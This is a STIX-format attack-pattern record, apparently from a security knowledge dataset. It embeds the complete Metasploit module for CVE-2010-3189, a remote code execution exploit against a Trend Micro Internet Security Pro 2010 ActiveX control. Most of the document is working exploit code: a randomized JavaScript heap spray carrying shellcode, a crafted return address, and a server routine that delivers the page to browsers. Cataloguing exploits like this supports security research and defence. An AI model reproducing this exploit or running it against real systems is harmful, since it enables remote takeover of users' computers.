{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c4dda984-e6c2-4a79-ae24-c7f2cb832409",
    "created": "2024-08-14T16:41:59.753929Z",
    "modified": "2024-08-14T16:41:59.753933Z",
    "name": "Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution",
    "description": " This module exploits a remote code execution vulnerability in Trend Micro Internet Security Pro 2010 ActiveX. When sending an invalid pointer to the extSetOwner() function of UfPBCtrl.dll an attacker may be able to execute arbitrary code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/trendmicro_extsetowner.rb",
            "external_id": "trendmicro_extsetowner.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3189"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n##\n# trendmicro_extsetowner.rb\n#\n# Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution exploit for the Metasploit Framework\n#\n# Exploit successfully tested on the following platforms:\n#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows XP SP3\n#  - Trend Micro Internet Security Pro 2010 on Internet Explorer 7, Windows Vista SP2\n#\n# UfPBCtrl.dll version tested:\n# File Version: 17.50.0.1366\n# ClassID: 15DBC3F9-9F0A-472E-8061-043D9CEC52F0\n# RegKey Safe for Script: True\n# RegKey Safe for Init: True\n# KillBitSet: False\n#\n# References:\n#  - CVE-2010-3189\n#  - OSVDB 67561\n#  - http://www.zerodayinitiative.com/advisories/ZDI-10-165/ - Original advisory by Andrea Micalizzi aka rgod via Zero Day Initiative\n#  - https://www.exploit-db.com/exploits/14878/ - MOAUB #03 exploit\n#  - https://www.exploit-db.com/trend-micro-internet-security-pro-2010-activex-extsetowner-remote-code-execution/ - MOAUB #03 binary analysis\n#  - http://www.rec-sec.com/2010/09/28/trend-micro-internet-security-2010-rce-exploit/ - Metasploit exploit by Trancer, Recognize-Security\n#\n# Trancer\n# http://www.rec-sec.com\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Trend Micro Internet Security Pro 2010 ActiveX extSetOwner() Remote Code Execution',\n      'Description'    => %q{\n          This module exploits a remote code execution vulnerability in Trend Micro\n        Internet Security Pro 2010 ActiveX.\n        When sending an invalid pointer to the extSetOwner() function of UfPBCtrl.dll\n        an attacker may be able to execute arbitrary code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Trancer <mtrancer[at]gmail.com>' ],\n      'References'     =>\n        [\n          [ 'CVE', '2010-3189' ],\n          [ 'OSVDB', '67561'],\n          [ 'ZDI', '10-165' ],\t# Andrea Micalizzi aka rgod via Zero Day Initiative\n          [ 'EDB', '14878' ],\t\t# MOAUB #03\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP2 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x00C750A1 } ] #??\n        ],\n      'DisclosureDate' => '2010-08-25',\n      'DefaultTarget'  => 0))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n    # Re-generate the payload.\n    return if ((p = regenerate_payload(cli)) == nil)\n\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Setup exploit buffers\n    nops      = Rex::Text.to_unescape(make_nops(4))\n    ret  \t  = Rex::Text.to_unescape([target.ret].pack('V'))\n    blocksize = 0x40000\n    fillto    = 500\n\n    # ActiveX parameters\n    clsid \t= \"15DBC3F9-9F0A-472E-8061-043D9CEC52F0\"\n\n    # Randomize the javascript variable names\n    ufpbctrl     = rand_text_alpha(rand(100) + 1)\n    j_shellcode  = rand_text_alpha(rand(100) + 1)\n    j_nops       = rand_text_alpha(rand(100) + 1)\n    j_ret        = rand_text_alpha(rand(100) + 1)\n    j_headersize = rand_text_alpha(rand(100) + 1)\n    j_slackspace = rand_text_alpha(rand(100) + 1)\n    j_fillblock  = rand_text_alpha(rand(100) + 1)\n    j_block      = rand_text_alpha(rand(100) + 1)\n    j_memory     = rand_text_alpha(rand(100) + 1)\n    j_counter    = rand_text_alpha(rand(30) + 2)\n    randnop      = rand_text_alpha(rand(100) + 1)\n\n    html = %Q|<html>\n<object classid='clsid:#{clsid}' id='#{ufpbctrl}'></object>\n<script>\nvar #{j_shellcode} = unescape('#{shellcode}');\nvar #{randnop} = \"#{nops}\";\nvar #{j_nops} = unescape(#{randnop});\nvar #{j_headersize} = 20;\nvar #{j_slackspace} = #{j_headersize} + #{j_shellcode}.length;\nwhile (#{j_nops}.length < #{j_slackspace}) #{j_nops} += #{j_nops};\nvar #{j_fillblock} = #{j_nops}.substring(0,#{j_slackspace});\nvar #{j_block} = #{j_nops}.substring(0,#{j_nops}.length - #{j_slackspace});\nwhile (#{j_block}.length + #{j_slackspace} < #{blocksize}) #{j_block} = #{j_block} + #{j_block} + #{j_fillblock};\nvar #{j_memory} = new Array();\nfor (#{j_counter} = 0; #{j_counter} < #{fillto}; #{j_counter}++) {\n  #{j_memory}[#{j_counter}] = #{j_block} + #{j_shellcode};\n}\n#{ufpbctrl}.extSetOwner(unescape('#{ret}'));\n</script>\n</html>|\n\n    print_status(\"Sending #{self.name}\")\n\n    # Transmit the response to the client\n    send_response(cli, html, { 'Content-Type' => 'text/html' })\n\n    # Handle the payload\n    handler(cli)\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-08-25",
    "x_mitre_platforms": [
        "win'"
    ]
}